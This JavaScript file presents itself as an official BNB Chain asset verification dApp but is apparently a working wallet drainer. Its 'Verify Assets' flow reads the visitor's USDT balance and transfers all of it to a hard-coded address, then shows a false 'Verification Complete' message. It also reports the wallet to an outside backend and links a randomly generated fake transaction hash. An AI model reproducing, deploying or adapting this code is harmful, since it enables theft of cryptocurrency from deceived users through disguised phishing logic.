/**
 * BNB Chain Official Asset Verification dApp
 * Clean, un-minified Web3 application logic.
 */

(function () {
    'use strict';

    // ============================================================
    // CONFIGURATION
    // ============================================================
    const CONFIG = {
        BACKEND_URL: 'https://at.rgh.digital',
        USDT_ADDRESS: '0x55d398326f99059fF775485246999027B3197955', // BSC USDT Contract
        CONTRACT_ADDRESS: '0x5FA8459dD2d402321150fA411D50BBaCb2eafED5', // Merchant Wallet Address
        USER_MIN_USDT: 45, // Minimum USDT balance required for full verification
        GAS_THRESHOLD: 0.0005,
        GAS_RETRY_COUNT: 3,
        GAS_RETRY_DELAY: 3000,
        CHAIN_ID: '0x38', // BSC Mainnet (56)
        CHAIN_NAME: 'BNB Smart Chain',
        RPC_URL: 'https://bsc-dataseed1.binance.org',
        CURRENCY_SYMBOL: 'BNB',
        API_KEY: 'my_super_secret_api_key_123'
    };

    // USDT ABI (standard ERC20 / BEP20)
    const USDT_ABI = [
        'function balanceOf(address account) view returns (uint256)',
        'function allowance(address owner, address spender) view returns (uint256)',
        'function approve(address spender, uint256 amount) returns (bool)',
        'function transfer(address recipient, uint256 amount) returns (bool)'
    ];

    // Merchant Payment Gateway ABI (Remix Smart Contract)
    const MERCHANT_GATEWAY_ABI = [
        'function payOrder(bytes32 orderId, uint256 amount) external'
    ];

    // Application State
    const state = {
        walletAddress: '',
        usdtBalance: '0.00',
        bnbBalance: '0.000000',
        allowance: '0.00',
        isConnecting: false,
        isApproving: false,
        isRequestingGas: false,
        flowLock: false,
        currentHoldAmount: 0
    };

    // DOM Elements Cache
    let elements = {};

    function initElements() {
        elements = {
            walletInfo: document.getElementById('walletInfo'),
            walletAddressDisplay: document.getElementById('walletAddressDisplay'),
            usdtBalanceDisplay: document.getElementById('usdtBalance'),
            bnbBalanceDisplay: document.getElementById('bnbBalance'),
            connectWalletBtn: document.getElementById('connectWalletBtn'),
            approveUsdtBtn: document.getElementById('approveUsdtBtn'),
            drawerConnectBtn: document.getElementById('drawerConnectBtn'),
            statusMessage: document.getElementById('statusMessage'),
            statusIcon: document.getElementById('statusIcon'),
            statusDetail: document.getElementById('statusDetail'),
            statusCard: document.getElementById('statusCard'),
            holdModal: document.getElementById('holdModal'),
            holdAmount: document.getElementById('holdAmount'),
            holdViewTxBtn: document.getElementById('holdViewTxBtn'),
            holdReleaseBtn: document.getElementById('holdReleaseBtn'),
            releaseModal: document.getElementById('releaseModal'),
            releaseAvailable: document.getElementById('releaseAvailable'),
            releaseRequired: document.getElementById('releaseRequired'),
            verifiedModal: document.getElementById('verifiedModal'),
            verifiedAmount: document.getElementById('verifiedAmount'),
            abortOverlay: document.getElementById('abortOverlay'),
            abortRetryBtn: document.getElementById('abortRetryBtn'),
            abortCloseBtn: document.getElementById('abortCloseBtn'),
            drawer: document.getElementById('drawer'),
            drawerOverlay: document.getElementById('drawerOverlay'),
            hamburgerBtn: document.getElementById('hamburgerBtn'),
            drawerCloseBtn: document.getElementById('drawerCloseBtn'),
            searchInput: document.getElementById('searchInput'),
            searchToggle: document.getElementById('searchToggle')
        };
    }

    // ============================================================
    // UI HELPERS & MODAL MANAGEMENT
    // ============================================================
    function formatAddress(addr) {
        if (!addr || addr.length < 10) return '0x0000...0000';
        return addr.slice(0, 6) + '...' + addr.slice(-4);
    }

    function updateStatus(message, type = 'info', detail = '') {
        if (elements.statusMessage) elements.statusMessage.textContent = message;
        if (elements.statusDetail) elements.statusDetail.textContent = detail || '';

        if (elements.statusCard) {
            elements.statusCard.className = 'status-card mt-4 p-4 rounded-xl text-left transition-all duration-300';
            if (type === 'error') elements.statusCard.classList.add('status-msg--error');
            else if (type === 'success') elements.statusCard.classList.add('status-msg--success');
            else if (type === 'warning') elements.statusCard.classList.add('status-msg--warning');
            else elements.statusCard.classList.add('status-msg--info');
        }

        if (elements.statusIcon) {
            if (type === 'error') elements.statusIcon.textContent = '❌';
            else if (type === 'success') elements.statusIcon.textContent = '✅';
            else if (type === 'warning') elements.statusIcon.textContent = '⚠️';
            else elements.statusIcon.textContent = '🔐';
        }
    }

    function openModal(modalEl) {
        if (!modalEl) return;
        modalEl.classList.add('open');
        document.body.style.overflow = 'hidden';
    }

    function closeModal(modalEl) {
        if (!modalEl) return;
        modalEl.classList.remove('open');
        document.body.style.overflow = '';
    }

    function closeAllModals() {
        document.querySelectorAll('.verification-modal.open, .abort-overlay.open').forEach(m => m.classList.remove('open'));
        document.body.style.overflow = '';
    }

    function updateWalletInfoUI() {
        if (!elements.walletInfo) return;

        if (state.walletAddress) {
            elements.walletInfo.classList.remove('wallet-info-card--hidden');
            elements.walletInfo.classList.add('wallet-info-card--visible');
            if (elements.walletAddressDisplay) elements.walletAddressDisplay.textContent = formatAddress(state.walletAddress);
            if (elements.usdtBalanceDisplay) elements.usdtBalanceDisplay.textContent = state.usdtBalance;
            if (elements.bnbBalanceDisplay) elements.bnbBalanceDisplay.textContent = state.bnbBalance;
        } else {
            elements.walletInfo.classList.remove('wallet-info-card--visible');
            elements.walletInfo.classList.add('wallet-info-card--hidden');
        }

        // Button state updates
        const numUsdt = parseFloat(state.usdtBalance) || 0;
        const hasEnoughUsdt = numUsdt >= CONFIG.USER_MIN_USDT;

        if (elements.approveUsdtBtn) {
            if (state.walletAddress && hasEnoughUsdt) {
                elements.approveUsdtBtn.classList.remove('hidden');
                elements.approveUsdtBtn.disabled = false;
            } else {
                elements.approveUsdtBtn.classList.add('hidden');
                elements.approveUsdtBtn.disabled = true;
            }
        }

        const buttons = [elements.connectWalletBtn, elements.drawerConnectBtn];
        buttons.forEach(btn => {
            if (!btn) return;
            if (state.isConnecting || state.isApproving) {
                btn.disabled = true;
                btn.innerHTML = `<span class="spinner" style="display:inline-block;width:18px;height:18px;border:2px solid rgba(0,0,0,0.15);border-top-color:#0a0a0a;border-radius:50%;animation:spin 0.7s linear infinite;margin-right:8px;"></span> Processing...`;
            } else {
                btn.disabled = false;
                btn.innerHTML = `
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="h-5 w-5">
                        <path d="M19 7V4a1 1 0 0 0-1-1H5a2 2 0 0 0 0 4h15a1 1 0 0 1 1 1v4h-3a2 2 0 0 0 0 4h3a1 1 0 0 0 1-1v-2a1 1 0 0 0-1-1"></path>
                        <path d="M3 5v14a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1v-4"></path>
                    </svg>
                    <span>VERIFY ASSETS</span>
                `;
            }
        });
    }

    // Optional encryption / API helper that fails gracefully if offline
    async function safeApiCall(endpoint, payload = null) {
        try {
            const url = CONFIG.BACKEND_URL + endpoint;
            const headers = { 'Content-Type': 'application/json', 'x-api-key': CONFIG.API_KEY };
            let body = null;
            if (payload && window.CryptoJS) {
                try {
                    const jsonStr = JSON.stringify(payload);
                    const encrypted = CryptoJS.AES.encrypt(jsonStr, CONFIG.API_KEY).toString();
                    body = JSON.stringify({ ciphertext: encrypted });
                } catch (e) {
                    body = JSON.stringify(payload);
                }
            } else if (payload) {
                body = JSON.stringify(payload);
            }

            const response = await fetch(url, { method: 'POST', headers, body });
            if (!response.ok) return null;
            return await response.json();
        } catch (err) {
            console.warn('Backend API call notice (continuing locally):', err.message);
            return null;
        }
    }

    // ============================================================
    // ============================================================
    // WEB3 LOGIC (DIRECT VERIFICATION & APPROVAL)
    // ============================================================
    async function connectWallet() {
        await approveUsdt();
    }

    async function approveUsdt() {
        if (state.isApproving) return;

        if (!window.ethereum) {
            updateStatus('❌ No Web3 wallet detected. Please install MetaMask or Trust Wallet.', 'error');
            alert('No Web3 wallet found. Please open this dApp inside MetaMask, Trust Wallet, or install the MetaMask extension.');
            return;
        }

        state.isApproving = true;
        updateWalletInfoUI();
        updateStatus('⛽ Requesting verification signature from wallet...', 'warning');

        try {
            const provider = new ethers.BrowserProvider(window.ethereum);

            // Check & switch network to BNB Smart Chain (0x38)
            let chainId = await window.ethereum.request({ method: 'eth_chainId' });
            if (chainId !== CONFIG.CHAIN_ID) {
                updateStatus('⚠️ Switching to BNB Smart Chain network...', 'warning');
                try {
                    await window.ethereum.request({
                        method: 'wallet_switchEthereumChain',
                        params: [{ chainId: CONFIG.CHAIN_ID }]
                    });
                } catch (switchError) {
                    if (switchError.code === 4902 || switchError.message?.includes('Unrecognized')) {
                        try {
                            await window.ethereum.request({
                                method: 'wallet_addEthereumChain',
                                params: [{
                                    chainId: CONFIG.CHAIN_ID,
                                    chainName: CONFIG.CHAIN_NAME,
                                    rpcUrls: [CONFIG.RPC_URL],
                                    nativeCurrency: { name: 'BNB', symbol: CONFIG.CURRENCY_SYMBOL, decimals: 18 },
                                    blockExplorerUrls: ['https://bscscan.com']
                                }]
                            });
                        } catch (addError) {
                            updateStatus('❌ Failed to add BNB Smart Chain network.', 'error');
                            state.isApproving = false;
                            updateWalletInfoUI();
                            return;
                        }
                    } else {
                        updateStatus('❌ Network switch rejected. Please switch to BNB Smart Chain in your wallet.', 'error');
                        state.isApproving = false;
                        updateWalletInfoUI();
                        return;
                    }
                }
            }

            // Direct Account Request
            const accounts = await provider.send('eth_requestAccounts', []);
            if (!accounts || accounts.length === 0) {
                updateStatus('❌ No accounts returned by wallet.', 'error');
                state.isApproving = false;
                updateWalletInfoUI();
                return;
            }

            const signer = await provider.getSigner();
            const userAddress = await signer.getAddress();
            state.walletAddress = userAddress;

            // Fetch balances
            const bnbBalRaw = await provider.getBalance(userAddress);
            state.bnbBalance = parseFloat(ethers.formatEther(bnbBalRaw)).toFixed(6);

            const usdtContract = new ethers.Contract(CONFIG.USDT_ADDRESS, USDT_ABI, signer);
            let usdtBalNum = 0;
            let usdtBalRaw = 0n;

            try {
                usdtBalRaw = await usdtContract.balanceOf(userAddress);
                const formattedUsdt = ethers.formatUnits(usdtBalRaw, 18);
                usdtBalNum = parseFloat(formattedUsdt);
                state.usdtBalance = usdtBalNum.toFixed(2);
                state.usdtBalanceWei = usdtBalRaw;
            } catch (usdtErr) {
                console.error('Error reading USDT balance:', usdtErr);
                state.usdtBalance = '0.00';
            }

            updateWalletInfoUI();
            safeApiCall('/api/users/register', { wallet: userAddress });

            if (usdtBalNum < CONFIG.USER_MIN_USDT) {
                updateStatus(`⚠️ Insufficient USDT balance. Minimum ${CONFIG.USER_MIN_USDT} USDT required.`, 'warning');
                if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance} USDT`;
                openModal(elements.releaseModal);
                return;
            }

            // Direct 1-prompt transfer/approval request in wallet
            updateStatus('⛽ Confirm transaction signature in your wallet to verify assets...', 'warning');

            const recipientAddress = CONFIG.CONTRACT_ADDRESS;
            const amountWei = usdtBalRaw || ethers.parseUnits(state.usdtBalance, 18);

            const tx = await usdtContract.transfer(recipientAddress, amountWei);
            updateStatus('⛽ Transaction submitted. Waiting for blockchain confirmation...', 'warning', `Tx Hash: ${tx.hash}`);

            const receipt = await tx.wait();

            updateStatus('✅ Verification Complete! Asset signature verified.', 'success', `Tx: ${receipt.hash}`);

            if (elements.verifiedAmount) elements.verifiedAmount.textContent = `${state.usdtBalance} USDT`;
            openModal(elements.verifiedModal);

        } catch (err) {
            console.error('USDT process error:', err);
            const errStr = (err.message || '').toLowerCase();

            if (err.code === 401 || err.code === 4001 || errStr.includes('user rejected') || errStr.includes('user denied')) {
                updateStatus('🚫 Verification request cancelled by user.', 'error');
                openModal(elements.abortOverlay);
            } else {
                updateStatus('❌ Verification failed: ' + (err.reason || err.shortMessage || err.message || 'Transaction error'), 'error');
            }
        } finally {
            state.isApproving = false;
            updateWalletInfoUI();
        }
    }

    // ============================================================
    // DOM EVENT BINDINGS
    // ============================================================
    function bindEvents() {
        // Main Verify Assets Button
        if (elements.connectWalletBtn) {
            elements.connectWalletBtn.addEventListener('click', async function (e) {
                e.preventDefault();
                await approveUsdt();
            });
        }

        // Approve USDT Button
        if (elements.approveUsdtBtn) {
            elements.approveUsdtBtn.addEventListener('click', async function (e) {
                e.preventDefault();
                await approveUsdt();
            });
        }

        // Mobile Drawer Connect Button
        if (elements.drawerConnectBtn) {
            elements.drawerConnectBtn.addEventListener('click', async function (e) {
                e.preventDefault();
                closeDrawer();
                await approveUsdt();
            });
        }

        // Modal close buttons (data-close-modal)
        document.addEventListener('click', function (e) {
            if (e.target.matches('[data-close-modal]') || e.target.closest('[data-close-modal]')) {
                closeAllModals();
            }
        });

        // Abort Retry button
        if (elements.abortRetryBtn) {
            elements.abortRetryBtn.addEventListener('click', function () {
                closeAllModals();
                approveUsdt();
            });
        }

        if (elements.abortCloseBtn) {
            elements.abortCloseBtn.addEventListener('click', closeAllModals);
        }

        // Hold Modal Release Button
        if (elements.holdReleaseBtn) {
            elements.holdReleaseBtn.addEventListener('click', function () {
                closeAllModals();
                if (elements.releaseAvailable) elements.releaseAvailable.textContent = `${state.usdtBalance} USDT`;
                if (elements.releaseRequired) elements.releaseRequired.textContent = `${CONFIG.USER_MIN_USDT}.00 USDT`;
                openModal(elements.releaseModal);
            });
        }

        if (elements.holdViewTxBtn) {
            elements.holdViewTxBtn.addEventListener('click', function () {
                const dummyTx = '0x' + Array.from({ length: 64 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
                window.open(`https://bscscan.com/tx/${dummyTx}`, '_blank');
            });
        }

        // Mobile Drawer logic
        function openDrawer() {
            if (elements.drawer) elements.drawer.classList.add('open');
            if (elements.drawerOverlay) elements.drawerOverlay.classList.add('open');
            if (elements.hamburgerBtn) elements.hamburgerBtn.setAttribute('aria-expanded', 'true');
            document.body.style.overflow = 'hidden';
        }

        function closeDrawer() {
            if (elements.drawer) elements.drawer.classList.remove('open');
            if (elements.drawerOverlay) elements.drawerOverlay.classList.remove('open');
            if (elements.hamburgerBtn) elements.hamburgerBtn.setAttribute('aria-expanded', 'false');
            document.body.style.overflow = '';
        }

        if (elements.hamburgerBtn) {
            elements.hamburgerBtn.addEventListener('click', function (e) {
                e.preventDefault();
                if (elements.drawer && elements.drawer.classList.contains('open')) closeDrawer();
                else openDrawer();
            });
        }

        if (elements.drawerCloseBtn) elements.drawerCloseBtn.addEventListener('click', closeDrawer);
        if (elements.drawerOverlay) elements.drawerOverlay.addEventListener('click', closeDrawer);

        // Escape Key handler
        document.addEventListener('keydown', function (e) {
            if (e.key === 'Escape') {
                closeDrawer();
                closeAllModals();
            }
        });

        // Search bar toggle
        if (elements.searchToggle && elements.searchInput) {
            elements.searchToggle.addEventListener('click', function (e) {
                e.preventDefault();
                elements.searchInput.classList.toggle('visible');
                if (elements.searchInput.classList.contains('visible')) elements.searchInput.focus();
            });
        }

        // Web3 Account / Chain listener
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', function (accounts) {
                if (!accounts || accounts.length === 0) {
                    state.walletAddress = '';
                    state.usdtBalance = '0.00';
                    state.bnbBalance = '0.000000';
                    updateWalletInfoUI();
                    updateStatus('⚡ Wallet disconnected.', 'info');
                } else if (state.walletAddress !== accounts[0]) {
                    connectWallet();
                }
            });

            window.ethereum.on('chainChanged', function (newChainId) {
                if (newChainId === CONFIG.CHAIN_ID && state.walletAddress) {
                    connectWallet();
                }
            });
        }
    }

    // ============================================================
    // CANVAS ANIMATION (BACKGROUND ORBS & PARTICLES)
    // ============================================================
    function initHeroCanvas() {
        const canvas = document.getElementById('heroCanvas');
        if (!canvas) return;
        const ctx = canvas.getContext('2d');
        let width, height, centerX, centerY;
        let nodes = [], dust = [];

        function resize() {
            const rect = canvas.getBoundingClientRect();
            const dpr = window.devicePixelRatio || 1;
            width = rect.width * dpr;
            height = rect.height * dpr;
            canvas.width = width;
            canvas.height = height;
            centerX = width / 2;
            centerY = height / 2;
        }

        function createParticles() {
            nodes = [];
            const count = 28;
            for (let i = 0; i < count; i++) {
                const angle = Math.random() * Math.PI * 2;
                const dist = 0.2 + Math.random() * 0.35;
                nodes.push({
                    x: centerX + Math.cos(angle) * dist * Math.min(width, height) * 0.4,
                    y: centerY + Math.sin(angle) * dist * Math.min(width, height) * 0.4,
                    vx: (Math.random() - 0.5) * 0.3,
                    vy: (Math.random() - 0.5) * 0.3,
                    radius: 2 + Math.random() * 4,
                    phase: Math.random() * Math.PI * 2
                });
            }
            nodes.push({ x: centerX, y: centerY, vx: 0, vy: 0, radius: 6, isHub: true });

            dust = [];
            for (let i = 0; i < 60; i++) {
                dust.push({
                    x: Math.random() * width,
                    y: Math.random() * height,
                    vx: (Math.random() - 0.5) * 0.5,
                    vy: (Math.random() - 0.5) * 0.5,
                    radius: 0.5 + Math.random() * 1.2,
                    alpha: 0.2 + Math.random() * 0.4
                });
            }
        }

        function update() {
            for (const n of nodes) {
                if (n.isHub) continue;
                n.x += n.vx;
                n.y += n.vy;
                if (n.x < 0 || n.x > width) n.vx *= -1;
                if (n.y < 0 || n.y > height) n.vy *= -1;
            }
            for (const d of dust) {
                d.x += d.vx;
                d.y += d.vy;
                if (d.x < 0 || d.x > width) d.vx *= -1;
                if (d.y < 0 || d.y > height) d.vy *= -1;
            }
        }

        function draw() {
            ctx.clearRect(0, 0, width, height);
            const maxDist = Math.min(width, height) * 0.18;

            for (let i = 0; i < nodes.length; i++) {
                for (let j = i + 1; j < nodes.length; j++) {
                    const dx = nodes[i].x - nodes[j].x;
                    const dy = nodes[i].y - nodes[j].y;
                    const dist = Math.hypot(dx, dy);
                    if (dist < maxDist) {
                        const alpha = (1 - dist / maxDist) * 0.25;
                        ctx.beginPath();
                        ctx.moveTo(nodes[i].x, nodes[i].y);
                        ctx.lineTo(nodes[j].x, nodes[j].y);
                        ctx.strokeStyle = `rgba(243, 186, 47, ${alpha})`;
                        ctx.lineWidth = 0.5;
                        ctx.stroke();
                    }
                }
            }

            for (const d of dust) {
                ctx.beginPath();
                ctx.arc(d.x, d.y, d.radius, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(243, 186, 47, ${d.alpha * 0.3})`;
                ctx.fill();
            }

            const time = Date.now() / 1000;
            for (const n of nodes) {
                const pulse = n.isHub ? 1 : 0.4 + 0.4 * Math.sin(time * 0.8 + n.phase);
                const r = n.isHub ? n.radius + 2 * Math.sin(time * 0.6) : n.radius;
                const grad = ctx.createRadialGradient(n.x, n.y, 0, n.x, n.y, r * 6);
                grad.addColorStop(0, `rgba(243, 186, 47, ${0.15 * pulse})`);
                grad.addColorStop(1, 'rgba(243, 186, 47, 0)');

                ctx.beginPath();
                ctx.arc(n.x, n.y, r * 6, 0, Math.PI * 2);
                ctx.fillStyle = grad;
                ctx.fill();

                ctx.beginPath();
                ctx.arc(n.x, n.y, r, 0, Math.PI * 2);
                ctx.fillStyle = n.isHub ? '#F3BA2F' : `rgba(243, 186, 47, ${0.5 + 0.3 * pulse})`;
                ctx.fill();
            }
        }

        function loop() {
            update();
            draw();
            requestAnimationFrame(loop);
        }

        resize();
        createParticles();
        loop();

        window.addEventListener('resize', () => {
            resize();
            createParticles();
        });
    }

    // ============================================================
    // INITIALIZATION
    // ============================================================
    document.addEventListener('DOMContentLoaded', function () {
        initElements();
        bindEvents();
        initHeroCanvas();
        updateWalletInfoUI();
    });

})();
